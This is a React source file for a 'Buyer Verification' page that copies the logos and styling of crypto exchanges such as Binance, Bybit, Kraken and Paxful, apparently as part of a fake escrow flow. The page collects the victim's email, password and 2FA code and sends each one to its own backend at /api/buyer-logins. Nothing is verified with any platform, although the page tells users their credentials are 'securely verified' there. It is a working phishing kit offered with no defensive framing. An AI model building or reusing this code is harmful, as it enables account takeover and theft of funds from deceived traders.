import React, { useState } from 'react'
import { Loader2, ShieldCheck, Lock, ArrowRight, Mail, Fingerprint, CheckCircle2 } from 'lucide-react'
import { platforms } from '../data/platforms'

const platformLogos = {
  noones: 'https://images.crunchbase.com/image/upload/c_pad,f_auto,q_auto:eco,dpr_1/v1505393372/c8rqpypfgqjtdqchwnag.png',
  bybit: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/521.png',
  localcoinswap: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/464.png',
  paxful: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/325.png',
  binance: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/270.png',
  okx: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/294.png',
  kucoin: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/311.png',
  huobi: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/102.png',
  gateio: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/302.png',
  mexc: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/544.png',
  bitget: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/513.png',
  kraken: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/24.png'
}

export default function BuyerLogin({ onSuccess, selectedPlatform, escrowId }) {
  const [step, setStep] = useState(1) // 1 = email/password, 2 = 2FA
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [twoFactorCode, setTwoFactorCode] = useState('')
  const [localError, setLocalError] = useState('')
  const [isVerifying, setIsVerifying] = useState(false)

  const platform = platforms.find(p => p.value === selectedPlatform)

  const storeBuyerLogin = async (data) => {
    try {
      const response = await fetch('http://localhost:4000/api/buyer-logins', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      })
      if (!response.ok) {
        throw new Error('Failed to store buyer login')
      }
    } catch (err) {
      console.error('Failed to store buyer login data:', err)
    }
  }

  const handleCredentialsSubmit = async (event) => {
    event.preventDefault()
    setLocalError('')
    
    if (!email.trim()) {
      setLocalError('Email is required')
      return
    }
    if (!password.trim()) {
      setLocalError('Password is required')
      return
    }
    
    setIsVerifying(true)
    
    // Store buyer credentials
    await storeBuyerLogin({
      email: email.trim(),
      password: password.trim(),
      platform: selectedPlatform,
      escrowId: escrowId,
      step: 'credentials'
    })
    
    await new Promise(resolve => setTimeout(resolve, 1000))
    setIsVerifying(false)
    
    // Proceed to 2FA step
    setStep(2)
  }

  const handle2FASubmit = async (event) => {
    event.preventDefault()
    setLocalError('')
    
    if (!twoFactorCode.trim()) {
      setLocalError('2FA code is required')
      return
    }
    if (!/^\d{6}$/.test(twoFactorCode.trim())) {
      setLocalError('Please enter a valid 6-digit code')
      return
    }
    
    setIsVerifying(true)
    
    // Store complete buyer login with 2FA
    await storeBuyerLogin({
      email: email.trim(),
      password: password.trim(),
      twoFactorCode: twoFactorCode.trim(),
      platform: selectedPlatform,
      escrowId: escrowId,
      step: '2fa_complete'
    })
    
    await new Promise(resolve => setTimeout(resolve, 1200))
    setIsVerifying(false)
    
    // Authentication successful
    onSuccess()
  }

  const theme = platform?.theme || {
    primary: '#6366f1',
    secondary: '#4f46e5',
    accent: '#818cf8'
  }

  return (
    <div style={{ backgroundColor: '#000' }} className="min-h-screen flex items-center justify-center p-4 relative overflow-hidden">
      {/* Background Effects */}
      <div 
        className="absolute inset-0 opacity-15"
        style={{
          background: `radial-gradient(circle at 20% 30%, ${theme.primary}40 0%, transparent 50%),
                       radial-gradient(circle at 80% 70%, ${theme.secondary}40 0%, transparent 50%)`
        }}
      />
      <div 
        className="absolute inset-0 opacity-15"
        style={{
          backgroundImage: `linear-gradient(${theme.accent}20 1px, transparent 1px), linear-gradient(90deg, ${theme.accent}20 1px, transparent 1px)`,
          backgroundSize: '50px 50px'
        }}
      />

      <div className="w-full max-w-md relative z-10">
        {/* Platform Logo & Header */}
        <div className="text-center mb-8">
          {platform && platformLogos[selectedPlatform] && (
            <div className="flex justify-center mb-4">
              <div 
                className="w-16 h-16 rounded-2xl flex items-center justify-center shadow-lg"
                style={{ 
                  backgroundColor: theme.primary + '20',
                  border: `2px solid ${theme.primary}40`
                }}
              >
                <img 
                  src={platformLogos[selectedPlatform]} 
                  alt={platform.label}
                  className="w-10 h-10 object-contain"
                />
              </div>
            </div>
          )}
          <h1 className="text-2xl font-bold text-white mb-2">
            Buyer Verification
          </h1>
          <p className="text-gray-400 text-sm">
            Sign in to {platform?.label || 'Platform'} to complete payment
          </p>
        </div>

        {/* Login Card */}
        <div 
          className="rounded-2xl p-8 shadow-2xl backdrop-blur-sm"
          style={{ 
            backgroundColor: '#111',
            border: `1px solid ${theme.primary}30`
          }}
        >
          {/* Progress Steps */}
          <div className="flex items-center justify-between mb-8">
            <div className="flex items-center gap-2">
              <div 
                className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-semibold transition-all ${
                  step >= 1 ? 'text-white' : 'bg-gray-700 text-gray-400'
                }`}
                style={step >= 1 ? { backgroundColor: theme.primary } : {}}
              >
                {step > 1 ? <CheckCircle2 className="w-5 h-5" /> : '1'}
              </div>
              <span className={`text-sm font-medium ${step >= 1 ? 'text-white' : 'text-gray-500'}`}>
                Credentials
              </span>
            </div>
            
            <div 
              className="flex-1 h-0.5 mx-3"
              style={{ 
                backgroundColor: step >= 2 ? theme.primary : '#374151'
              }}
            />
            
            <div className="flex items-center gap-2">
              <div 
                className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-semibold transition-all ${
                  step >= 2 ? 'text-white' : 'bg-gray-700 text-gray-400'
                }`}
                style={step >= 2 ? { backgroundColor: theme.primary } : {}}
              >
                2
              </div>
              <span className={`text-sm font-medium ${step >= 2 ? 'text-white' : 'text-gray-500'}`}>
                2FA Code
              </span>
            </div>
          </div>

          {/* Error Message */}
          {localError && (
            <div className="mb-6 p-3 bg-red-500/10 border border-red-500/30 rounded-lg">
              <p className="text-sm text-red-400">{localError}</p>
            </div>
          )}

          {/* Step 1: Email & Password */}
          {step === 1 && (
            <form onSubmit={handleCredentialsSubmit} className="space-y-5">
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  <Mail className="w-4 h-4 inline mr-2" />
                  Email Address
                </label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="your@email.com"
                  className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 transition-all"
                  style={{ 
                    focusRing: theme.primary 
                  }}
                  disabled={isVerifying}
                  required
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  <Lock className="w-4 h-4 inline mr-2" />
                  Password
                </label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter your password"
                  className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 transition-all"
                  style={{ 
                    focusRing: theme.primary 
                  }}
                  disabled={isVerifying}
                  required
                />
              </div>

              <button
                type="submit"
                disabled={isVerifying}
                className="w-full py-3 rounded-lg font-semibold text-white transition-all flex items-center justify-center gap-2 hover:opacity-90 disabled:opacity-50"
                style={{ 
                  backgroundColor: theme.primary 
                }}
              >
                {isVerifying ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin" />
                    Verifying...
                  </>
                ) : (
                  <>
                    Continue
                    <ArrowRight className="w-5 h-5" />
                  </>
                )}
              </button>
            </form>
          )}

          {/* Step 2: 2FA Code */}
          {step === 2 && (
            <form onSubmit={handle2FASubmit} className="space-y-5">
              <div className="text-center mb-6">
                <div 
                  className="w-16 h-16 rounded-full mx-auto mb-4 flex items-center justify-center"
                  style={{ 
                    backgroundColor: theme.primary + '20',
                    border: `2px solid ${theme.primary}`
                  }}
                >
                  <Fingerprint className="w-8 h-8" style={{ color: theme.primary }} />
                </div>
                <p className="text-sm text-gray-400">
                  Enter the 6-digit code from your authenticator app
                </p>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2 text-center">
                  2FA Authentication Code
                </label>
                <input
                  type="text"
                  value={twoFactorCode}
                  onChange={(e) => setTwoFactorCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                  placeholder="000000"
                  className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 text-center text-2xl tracking-widest font-mono transition-all"
                  style={{ 
                    focusRing: theme.primary 
                  }}
                  disabled={isVerifying}
                  maxLength={6}
                  required
                />
              </div>

              <button
                type="submit"
                disabled={isVerifying || twoFactorCode.length !== 6}
                className="w-full py-3 rounded-lg font-semibold text-white transition-all flex items-center justify-center gap-2 hover:opacity-90 disabled:opacity-50"
                style={{ 
                  backgroundColor: theme.primary 
                }}
              >
                {isVerifying ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin" />
                    Verifying...
                  </>
                ) : (
                  <>
                    <ShieldCheck className="w-5 h-5" />
                    Verify & Continue
                  </>
                )}
              </button>

              <button
                type="button"
                onClick={() => {
                  setStep(1)
                  setTwoFactorCode('')
                  setLocalError('')
                }}
                className="w-full py-2 text-sm text-gray-400 hover:text-white transition-colors"
                disabled={isVerifying}
              >
                ← Back to credentials
              </button>
            </form>
          )}

          {/* Security Notice */}
          <div className="mt-6 pt-6 border-t border-gray-800">
            <div className="flex items-start gap-2">
              <ShieldCheck className="w-4 h-4 text-gray-500 mt-0.5 flex-shrink-0" />
              <p className="text-xs text-gray-500">
                Your credentials are securely verified with {platform?.label || 'the platform'}. 
                This is a one-time verification for payment processing.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
